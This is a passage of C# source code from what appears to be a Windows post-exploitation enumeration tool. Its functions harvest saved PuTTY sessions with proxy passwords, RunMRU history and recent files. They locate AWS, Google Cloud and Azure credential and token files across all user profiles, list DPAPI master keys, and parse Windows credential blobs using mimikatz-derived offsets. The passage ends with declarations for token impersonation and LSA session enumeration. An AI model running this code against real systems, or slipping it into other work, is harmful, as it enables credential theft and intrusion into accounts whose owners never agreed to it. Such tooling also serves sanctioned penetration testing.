                        results = MyUtils.GetRegValues("HKU", String.Format("{0}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", SID));
                }
            }
            else
            {
                results = MyUtils.GetRegValues("HKCU", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU");
            }
            return results;
        }

        public static List<Dictionary<string, string>> GetPuttySessions()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // extracts saved putty sessions and basic configs (via the registry)
            if (MyUtils.IsHighIntegrity())
            {
                Console.WriteLine("\r\n\r\n=== Putty Saved Session Information (All Users) ===\r\n");

                string[] SIDs = Registry.Users.GetSubKeyNames();
                foreach (string SID in SIDs)
                {
                    if (SID.StartsWith("S-1-5") && !SID.EndsWith("_Classes"))
                    {
                        string[] subKeys = MyUtils.GetRegSubkeys("HKU", String.Format("{0}\\Software\\SimonTatham\\PuTTY\\Sessions\\", SID));

                        foreach (string sessionName in subKeys)
                        {
                            Dictionary<string, string> putty_sess = new Dictionary<string, string>()
                            {
                                { "User SID", SID },
                                { "SessionName", sessionName },
                                { "HostName", "" },
                                { "PortNumber", ""},
                                { "UserName", "" },
                                { "PublicKeyFile", "" },
                                { "PortForwardings", "" },
                                { "ConnectionSharing", "" },
                                { "ProxyPassword", "" },
                                { "ProxyUsername", "" },
                            };

                            string[] keys =
                            {
                                "HostName",
                                "PortNumber",
                                "UserName",
                                "PublicKeyFile",
                                "PortForwardings",
                                "ConnectionSharing",
                                "ProxyPassword",
                                "ProxyUsername",
                            };

                            foreach (string key in keys)
                                putty_sess[key] = MyUtils.GetRegValue("HKU", String.Format("{0}\\Software\\SimonTatham\\PuTTY\\Sessions\\{1}", SID, sessionName), key);

                            results.Add(putty_sess);
                        }
                    }
                }
            }
            else
            {
                string[] subKeys = MyUtils.GetRegSubkeys("HKCU", "Software\\SimonTatham\\PuTTY\\Sessions\\");
                foreach (string sessionName in subKeys)
                {
                    Dictionary<string, string> putty_sess = new Dictionary<string, string>()
                    {
                        { "SessionName", sessionName },
                        { "HostName", "" },
                        { "PortNumber", "" },
                        { "UserName", "" },
                        { "PublicKeyFile", "" },
                        { "PortForwardings", "" },
                        { "ConnectionSharing", "" },
                        { "ProxyPassword", "" },
                        { "ProxyUsername", "" },
                    };

                    string[] keys =
                    {
                        "HostName",
                        "PortNumber",
                        "UserName",
                        "PublicKeyFile",
                        "PortForwardings",
                        "ConnectionSharing",
                        "ProxyPassword",
                        "ProxyUsername",
                    };

                    foreach (string key in keys)
                        putty_sess[key] = MyUtils.GetRegValue("HKCU", String.Format("Software\\SimonTatham\\PuTTY\\Sessions\\{0}", sessionName), key);

                    results.Add(putty_sess);
                }
            }
            return results;
        }


        public static List<Dictionary<string, string>> ListPuttySSHHostKeys()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // extracts saved putty host keys (via the registry)
            if (MyUtils.IsHighIntegrity())
            {
                Console.WriteLine("\r\n\r\n=== Putty SSH Host Hosts (All Users) ===\r\n");

                string[] SIDs = Registry.Users.GetSubKeyNames();
                foreach (string SID in SIDs)
                {
                    if (SID.StartsWith("S-1-5") && !SID.EndsWith("_Classes"))
                    {
                        Dictionary<string, object> hostKeys = MyUtils.GetRegValues("HKU", String.Format("{0}\\Software\\SimonTatham\\PuTTY\\SshHostKeys\\", SID));
                        if ((hostKeys != null) && (hostKeys.Count != 0))
                        {
                            Dictionary<string, string> putty_ssh = new Dictionary<string, string>();
                            putty_ssh["UserSID"] = SID;
                            foreach (KeyValuePair<string, object> kvp in hostKeys)
                            {
                                putty_ssh[kvp.Key] = ""; //Looks like only matters the key name, not the value
                            }
                            results.Add(putty_ssh);
                        }
                    }
                }
            }
            else
            {
                Dictionary<string, object> hostKeys = MyUtils.GetRegValues("HKCU", "Software\\SimonTatham\\PuTTY\\SshHostKeys\\");
                if ((hostKeys != null) && (hostKeys.Count != 0))
                {
                    Dictionary<string, string> putty_ssh = new Dictionary<string, string>();
                    foreach (KeyValuePair<string, object> kvp in hostKeys)
                    {
                        putty_ssh[kvp.Key] = ""; //Looks like only matters the key name, not the value
                    }
                    results.Add(putty_ssh);
                }
            }
            return results;
        }

        public static List<Dictionary<string, string>> ListCloudCreds()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // checks for various cloud credential files (AWS, Microsoft Azure, and Google Compute)
            // adapted from https://twitter.com/cmaddalena's SharpCloud project (https://github.com/chrismaddalena/SharpCloud/)
            try
            {
                if (MyUtils.IsHighIntegrity())
                {
                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string awsKeyFile = String.Format("{0}\\.aws\\credentials", dir);
                            if (System.IO.File.Exists(awsKeyFile))
                            {
                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(awsKeyFile);
                                DateTime lastModified = System.IO.File.GetLastWriteTime(awsKeyFile);
                                long size = new System.IO.FileInfo(awsKeyFile).Length;
                                results.Add(new Dictionary<string, string>() {
                                    { "file", awsKeyFile },
                                    { "Description", "AWS credentials file" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                            }
                            string computeCredsDb = String.Format("{0}\\AppData\\Roaming\\gcloud\\credentials.db", dir);
                            if (System.IO.File.Exists(computeCredsDb))
                            {
                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeCredsDb);
                                DateTime lastModified = System.IO.File.GetLastWriteTime(computeCredsDb);
                                long size = new System.IO.FileInfo(computeCredsDb).Length;
                                results.Add(new Dictionary<string, string>() {
                                    { "file", computeCredsDb },
                                    { "Description", "GC Compute creds" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                            }
                            string computeLegacyCreds = String.Format("{0}\\AppData\\Roaming\\gcloud\\legacy_credentials", dir);
                            if (System.IO.File.Exists(computeLegacyCreds))
                            {
                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeLegacyCreds);
                                DateTime lastModified = System.IO.File.GetLastWriteTime(computeLegacyCreds);
                                long size = new System.IO.FileInfo(computeLegacyCreds).Length;
                                results.Add(new Dictionary<string, string>() {
                                    { "file", computeLegacyCreds },
                                    { "Description", "GC Compute creds legacy" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                            }
                            string computeAccessTokensDb = String.Format("{0}\\AppData\\Roaming\\gcloud\\access_tokens.db", dir);
                            if (System.IO.File.Exists(computeAccessTokensDb))
                            {
                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeAccessTokensDb);
                                DateTime lastModified = System.IO.File.GetLastWriteTime(computeAccessTokensDb);
                                long size = new System.IO.FileInfo(computeAccessTokensDb).Length;
                                results.Add(new Dictionary<string, string>() {
                                    { "file", computeAccessTokensDb },
                                    { "Description", "GC Compute tokens" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                            }
                            string azureTokens = String.Format("{0}\\.azure\\accessTokens.json", dir);
                            if (System.IO.File.Exists(azureTokens))
                            {
                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(azureTokens);
                                DateTime lastModified = System.IO.File.GetLastWriteTime(azureTokens);
                                long size = new System.IO.FileInfo(azureTokens).Length;
                                results.Add(new Dictionary<string, string>() {
                                    { "file", azureTokens },
                                    { "Description", "Azure tokens" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                            }
                            string azureProfile = String.Format("{0}\\.azure\\azureProfile.json", dir);
                            if (System.IO.File.Exists(azureProfile))
                            {
                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(azureProfile);
                                DateTime lastModified = System.IO.File.GetLastWriteTime(azureProfile);
                                long size = new System.IO.FileInfo(azureProfile).Length;
                                results.Add(new Dictionary<string, string>() {
                                    { "file", azureProfile },
                                    { "Description", "Azure profile" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                            }
                        }
                    }
                }
                else
                {
                    string awsKeyFile = String.Format("{0}\\.aws\\credentials", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    if (System.IO.File.Exists(awsKeyFile))
                    {
                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(awsKeyFile);
                        DateTime lastModified = System.IO.File.GetLastWriteTime(awsKeyFile);
                        long size = new System.IO.FileInfo(awsKeyFile).Length;
                        results.Add(new Dictionary<string, string>() {
                                    { "file", awsKeyFile },
                                    { "Description", "AWS keys file" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                    }
                    string computeCredsDb = String.Format("{0}\\AppData\\Roaming\\gcloud\\credentials.db", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    if (System.IO.File.Exists(computeCredsDb))
                    {
                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeCredsDb);
                        DateTime lastModified = System.IO.File.GetLastWriteTime(computeCredsDb);
                        long size = new System.IO.FileInfo(computeCredsDb).Length;
                        results.Add(new Dictionary<string, string>() {
                                    { "file", computeCredsDb },
                                    { "Description", "GC Compute creds" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                    }
                    string computeLegacyCreds = String.Format("{0}\\AppData\\Roaming\\gcloud\\legacy_credentials", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    if (System.IO.File.Exists(computeLegacyCreds))
                    {
                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeLegacyCreds);
                        DateTime lastModified = System.IO.File.GetLastWriteTime(computeLegacyCreds);
                        long size = new System.IO.FileInfo(computeLegacyCreds).Length;
                        results.Add(new Dictionary<string, string>() {
                                    { "file", computeLegacyCreds },
                                    { "Description", "GC Compute creds legacy" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                    }
                    string computeAccessTokensDb = String.Format("{0}\\AppData\\Roaming\\gcloud\\access_tokens.db", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    if (System.IO.File.Exists(computeAccessTokensDb))
                    {
                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeAccessTokensDb);
                        DateTime lastModified = System.IO.File.GetLastWriteTime(computeAccessTokensDb);
                        long size = new System.IO.FileInfo(computeAccessTokensDb).Length;
                        results.Add(new Dictionary<string, string>() {
                                    { "file", computeAccessTokensDb },
                                    { "Description", "GC Compute tokens" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                    }
                    string azureTokens = String.Format("{0}\\.azure\\accessTokens.json", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    if (System.IO.File.Exists(azureTokens))
                    {
                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(azureTokens);
                        DateTime lastModified = System.IO.File.GetLastWriteTime(azureTokens);
                        long size = new System.IO.FileInfo(azureTokens).Length;
                        results.Add(new Dictionary<string, string>() {
                                    { "file", azureTokens },
                                    { "Description", "Azure tokens" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                    }
                    string azureProfile = String.Format("{0}\\.azure\\azureProfile.json", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    if (System.IO.File.Exists(azureProfile))
                    {
                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(azureProfile);
                        DateTime lastModified = System.IO.File.GetLastWriteTime(azureProfile);
                        long size = new System.IO.FileInfo(azureProfile).Length;
                        results.Add(new Dictionary<string, string>() {
                                    { "file", azureProfile },
                                    { "Description", "Azure profile" },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { "Size", String.Format("{0}", size) }
                                });
                    }
                }
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex));
            }
            return results;
        }


        public static List<Dictionary<string, string>> GetRecentFiles()
        {
            // parses recent file shortcuts via COM
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            int lastDays = 7;
            DateTime startTime = System.DateTime.Now.AddDays(-lastDays);

            try
            {
                // WshShell COM object GUID 
                Type shell = Type.GetTypeFromCLSID(new Guid("F935DC22-1CF0-11d0-ADB9-00C04FD58A0B"));
                Object shellObj = Activator.CreateInstance(shell);

                if (MyUtils.IsHighIntegrity())
                {
                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];

                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string recentPath = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\", dir);
                            try
                            {
                                string[] recentFiles = Directory.GetFiles(recentPath, "*.lnk", SearchOption.AllDirectories);

                                if (recentFiles.Length != 0)
                                {
                                    Console.WriteLine("   {0} :\r\n", userName);
                                    foreach (string recentFile in recentFiles)
                                    {
                                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(recentFile);

                                        if (lastAccessed > startTime)
                                        {
                                            // invoke the WshShell com object, creating a shortcut to then extract the TargetPath from
                                            Object shortcut = shellObj.GetType().InvokeMember("CreateShortcut", BindingFlags.InvokeMethod, null, shellObj, new object[] { recentFile });
                                            Object TargetPath = shortcut.GetType().InvokeMember("TargetPath", BindingFlags.GetProperty, null, shortcut, new object[] { });

                                            if (TargetPath.ToString().Trim() != "")
                                            {
                                                results.Add(new Dictionary<string, string>()
                                                {
                                                    { "Target", TargetPath.ToString() },
                                                    { "Accessed", String.Format("{0}", lastAccessed) }
                                                });
                                            }
                                            Marshal.ReleaseComObject(shortcut);
                                            shortcut = null;
                                        }
                                    }
                                }
                            }
                            catch { }
                        }
                    }
                }
                else
                {
                    string recentPath = String.Format("{0}\\Microsoft\\Windows\\Recent\\", System.Environment.GetEnvironmentVariable("APPDATA"));

                    string[] recentFiles = Directory.GetFiles(recentPath, "*.lnk", SearchOption.AllDirectories);

                    foreach (string recentFile in recentFiles)
                    {
                        // old method (needed interop dll)
                        //WshShell shell = new WshShell();
                        //IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(recentFile);

                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(recentFile);

                        if (lastAccessed > startTime)
                        {
                            // invoke the WshShell com object, creating a shortcut to then extract the TargetPath from
                            Object shortcut = shellObj.GetType().InvokeMember("CreateShortcut", BindingFlags.InvokeMethod, null, shellObj, new object[] { recentFile });
                            Object TargetPath = shortcut.GetType().InvokeMember("TargetPath", BindingFlags.GetProperty, null, shortcut, new object[] { });
                            if (TargetPath.ToString().Trim() != "")
                            {
                                results.Add(new Dictionary<string, string>()
                                {
                                    { "Target", TargetPath.ToString() },
                                    { "Accessed", String.Format("{0}", lastAccessed) }
                                });
                            }
                            Marshal.ReleaseComObject(shortcut);
                            shortcut = null;
                        }
                    }
                }
                // release the WshShell COM object
                Marshal.ReleaseComObject(shellObj);
                shellObj = null;
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex));
            }
            return results;
        }

        public static List<Dictionary<string, string>> ListMasterKeys()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // lists any found DPAPI master keys
            try
            {
                if (MyUtils.IsHighIntegrity())
                {
                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            List<string> userDPAPIBasePaths = new List<string>();
                            userDPAPIBasePaths.Add(String.Format("{0}\\AppData\\Roaming\\Microsoft\\Protect\\", System.Environment.GetEnvironmentVariable("USERPROFILE")));
                            userDPAPIBasePaths.Add(String.Format("{0}\\AppData\\Local\\Microsoft\\Protect\\", System.Environment.GetEnvironmentVariable("USERPROFILE")));

                            foreach (string userDPAPIBasePath in userDPAPIBasePaths)
                            {
                                if (System.IO.Directory.Exists(userDPAPIBasePath))
                                {
                                    string[] directories = Directory.GetDirectories(userDPAPIBasePath);
                                    foreach (string directory in directories)
                                    {
                                        string[] files = Directory.GetFiles(directory);

                                        foreach (string file in files)
                                        {
                                            if (Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                                            {
                                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(file);
                                                DateTime lastModified = System.IO.File.GetLastWriteTime(file);
                                                string fileName = System.IO.Path.GetFileName(file);
                                                results.Add(new Dictionary<string, string>()
                                            {
                                                { "MasterKey", file },
                                                { "Accessed", String.Format("{0}", lastAccessed) },
                                                { "Modified", String.Format("{0}", lastModified) },
                                            });
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                else
                {
                    string userName = Environment.GetEnvironmentVariable("USERNAME");
                    List<string> userDPAPIBasePaths = new List<string>();
                    userDPAPIBasePaths.Add(String.Format("{0}\\AppData\\Roaming\\Microsoft\\Protect\\", System.Environment.GetEnvironmentVariable("USERPROFILE")));
                    userDPAPIBasePaths.Add(String.Format("{0}\\AppData\\Local\\Microsoft\\Protect\\", System.Environment.GetEnvironmentVariable("USERPROFILE")));

                    foreach (string userDPAPIBasePath in userDPAPIBasePaths) 
                    {
                        if (System.IO.Directory.Exists(userDPAPIBasePath))
                        {
                            string[] directories = Directory.GetDirectories(userDPAPIBasePath);
                            foreach (string directory in directories)
                            {
                                string[] files = Directory.GetFiles(directory);

                                foreach (string file in files)
                                {
                                    if (Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                                    {
                                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(file);
                                        DateTime lastModified = System.IO.File.GetLastWriteTime(file);
                                        string fileName = System.IO.Path.GetFileName(file);
                                        results.Add(new Dictionary<string, string>()
                                    {
                                        { "MasterKey", file },
                                        { "Accessed", String.Format("{0}", lastAccessed) },
                                        { "Modified", String.Format("{0}", lastModified) },
                                    });
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }
            return results;
        }


        public static List<Dictionary<string, string>> GetCredFiles()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // lists any found files in Local\Microsoft\Credentials\*
            try
            {
                if (MyUtils.IsHighIntegrity())
                {
                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);

                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            List<string> userCredFilePaths = new List<string>();
                            userCredFilePaths.Add(String.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", dir));
                            userCredFilePaths.Add(String.Format("{0}\\AppData\\Roaming\\Microsoft\\Credentials\\", dir));

                            foreach (string userCredFilePath in userCredFilePaths)
                            {
                                if (System.IO.Directory.Exists(userCredFilePath))
                                {
                                    string[] systemFiles = Directory.GetFiles(userCredFilePath);
                                    if ((systemFiles != null) && (systemFiles.Length != 0))
                                    {
                                        foreach (string file in systemFiles)
                                        {
                                            DateTime lastAccessed = System.IO.File.GetLastAccessTime(file);
                                            DateTime lastModified = System.IO.File.GetLastWriteTime(file);
                                            long size = new System.IO.FileInfo(file).Length;
                                            string fileName = System.IO.Path.GetFileName(file);

                                            // jankily parse the bytes to extract the credential type and master key GUID
                                            // reference- https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/modules/kull_m_dpapi.h#L24-L54
                                            byte[] credentialArray = File.ReadAllBytes(file);
                                            byte[] guidMasterKeyArray = new byte[16];
                                            Array.Copy(credentialArray, 36, guidMasterKeyArray, 0, 16);
                                            Guid guidMasterKey = new Guid(guidMasterKeyArray);

                                            byte[] stringLenArray = new byte[16];
                                            Array.Copy(credentialArray, 56, stringLenArray, 0, 4);
                                            int descLen = BitConverter.ToInt32(stringLenArray, 0);

                                            byte[] descBytes = new byte[descLen];
                                            Array.Copy(credentialArray, 60, descBytes, 0, descLen - 4);

                                            string desc = Encoding.Unicode.GetString(descBytes);
                                            results.Add(new Dictionary<string, string>()
                                        {
                                            { "CredFile", file },
                                            { "Description", desc },
                                            { "MasterKey", String.Format("{0}", guidMasterKey) },
                                            { "Accessed", String.Format("{0}", lastAccessed) },
                                            { "Modified", String.Format("{0}", lastModified) },
                                            { "Size", String.Format("{0}", size) },
                                        });
                                        }
                                    }
                                }
                            }
                        }
                    }

                    string systemFolder = String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot"));
                    string[] files = Directory.GetFiles(systemFolder);
                    if ((files != null) && (files.Length != 0))
                    {
                        foreach (string file in files)
                        {
                            DateTime lastAccessed = System.IO.File.GetLastAccessTime(file);
                            DateTime lastModified = System.IO.File.GetLastWriteTime(file);
                            long size = new System.IO.FileInfo(file).Length;
                            string fileName = System.IO.Path.GetFileName(file);

                            // jankily parse the bytes to extract the credential type and master key GUID
                            // reference- https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/modules/kull_m_dpapi.h#L24-L54
                            byte[] credentialArray = File.ReadAllBytes(file);
                            byte[] guidMasterKeyArray = new byte[16];
                            Array.Copy(credentialArray, 36, guidMasterKeyArray, 0, 16);
                            Guid guidMasterKey = new Guid(guidMasterKeyArray);

                            byte[] stringLenArray = new byte[16];
                            Array.Copy(credentialArray, 56, stringLenArray, 0, 4);
                            int descLen = BitConverter.ToInt32(stringLenArray, 0);

                            byte[] descBytes = new byte[descLen];
                            Array.Copy(credentialArray, 60, descBytes, 0, descLen - 4);

                            string desc = Encoding.Unicode.GetString(descBytes);
                            results.Add(new Dictionary<string, string>()
                            {
                                { "CredFile", file },
                                { "Description", desc },
                                { "MasterKey", String.Format("{0}", guidMasterKey) },
                                { "Accessed", String.Format("{0}", lastAccessed) },
                                { "Modified", String.Format("{0}", lastModified) },
                                { "Size", String.Format("{0}", size) },
                            });
                        }
                    }
                }
                else
                {
                    string userName = Environment.GetEnvironmentVariable("USERNAME");
                    List<string> userCredFilePaths = new List<string>();
                    userCredFilePaths.Add(String.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", System.Environment.GetEnvironmentVariable("USERPROFILE")));
                    userCredFilePaths.Add(String.Format("{0}\\AppData\\Roaming\\Microsoft\\Credentials\\", System.Environment.GetEnvironmentVariable("USERPROFILE")));

                    foreach (string userCredFilePath in userCredFilePaths)
                    {
                        if (System.IO.Directory.Exists(userCredFilePath))
                        {
                            string[] files = Directory.GetFiles(userCredFilePath);

                            foreach (string file in files)
                            {
                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(file);
                                DateTime lastModified = System.IO.File.GetLastWriteTime(file);
                                long size = new System.IO.FileInfo(file).Length;
                                string fileName = System.IO.Path.GetFileName(file);

                                // jankily parse the bytes to extract the credential type and master key GUID
                                // reference- https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/modules/kull_m_dpapi.h#L24-L54
                                byte[] credentialArray = File.ReadAllBytes(file);
                                byte[] guidMasterKeyArray = new byte[16];
                                Array.Copy(credentialArray, 36, guidMasterKeyArray, 0, 16);
                                Guid guidMasterKey = new Guid(guidMasterKeyArray);

                                byte[] stringLenArray = new byte[16];
                                Array.Copy(credentialArray, 56, stringLenArray, 0, 4);
                                int descLen = BitConverter.ToInt32(stringLenArray, 0);

                                byte[] descBytes = new byte[descLen];
                                Array.Copy(credentialArray, 60, descBytes, 0, descLen - 4);

                                string desc = Encoding.Unicode.GetString(descBytes);
                                results.Add(new Dictionary<string, string>()
                                {
                                { "CredFile", file },
                                { "Description", desc },
                                { "MasterKey", String.Format("{0}", guidMasterKey) },
                                { "Accessed", String.Format("{0}", lastAccessed) },
                                { "Modified", String.Format("{0}", lastModified) },
                                { "Size", String.Format("{0}", size) },
                            });
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }
            return results;
        }


        public static List<Dictionary<string, string>> GetRDCManFiles()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();
            // lists any found files in Local\Microsoft\Credentials\*
            try
            {
                if (MyUtils.IsHighIntegrity())
                {
                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);

                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string userRDManFile = String.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", dir);
                            if (System.IO.File.Exists(userRDManFile))
                            {
                                XmlDocument xmlDoc = new XmlDocument();
                                xmlDoc.Load(userRDManFile);

                                // grab the recent RDG files
                                XmlNodeList filesToOpen = xmlDoc.GetElementsByTagName("FilesToOpen");
                                XmlNodeList items = filesToOpen[0].ChildNodes;
                                XmlNode node = items[0];

                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(userRDManFile);
                                DateTime lastModified = System.IO.File.GetLastWriteTime(userRDManFile);
                                Dictionary<string, string> rdg = new Dictionary<string, string>(){
                                    { "RDCManFile", userRDManFile },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { ".RDG Files", "" },
                                };

                                foreach (XmlNode rdgFile in items)
                                    rdg[".RDG Files"] += rdgFile.InnerText;

                                results.Add(rdg);
                            }
                        }
                    }
                }
                else
                {
                    string userName = Environment.GetEnvironmentVariable("USERNAME");
                    string userRDManFile = String.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                    if (System.IO.File.Exists(userRDManFile))
                    {
                        XmlDocument xmlDoc = new XmlDocument();
                        xmlDoc.Load(userRDManFile);

                        // grab the recent RDG files
                        XmlNodeList filesToOpen = xmlDoc.GetElementsByTagName("FilesToOpen");
                        XmlNodeList items = filesToOpen[0].ChildNodes;
                        XmlNode node = items[0];

                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(userRDManFile);
                        DateTime lastModified = System.IO.File.GetLastWriteTime(userRDManFile);
                        Dictionary<string, string> rdg = new Dictionary<string, string>(){
                                    { "RDCManFile", userRDManFile },
                                    { "Accessed", String.Format("{0}", lastAccessed) },
                                    { "Modified", String.Format("{0}", lastModified) },
                                    { ".RDG Files", "" },
                                };

                        foreach (XmlNode rdgFile in items)
                            rdg[".RDG Files"] += rdgFile.InnerText;
                        results.Add(rdg);
                    }
                }
            }
            catch (Exception ex)
            {
                Beaprint.GrayPrint(String.Format("  [X] Exception: {0}", ex.Message));
            }
            return results;
        }


        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

        [DllImport("secur32.dll", SetLastError = true)]
        public static extern int LsaRegisterLogonProcess(LSA_STRING_IN LogonProcessName, out IntPtr LsaHandle, out ulong SecurityMode);

        [DllImport("advapi32.dll")]
        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("Secur32.dll", SetLastError = false)]
        private static extern uint LsaEnumerateLogonSessions(out UInt64 LogonSessionCount, out IntPtr LogonSessionList);

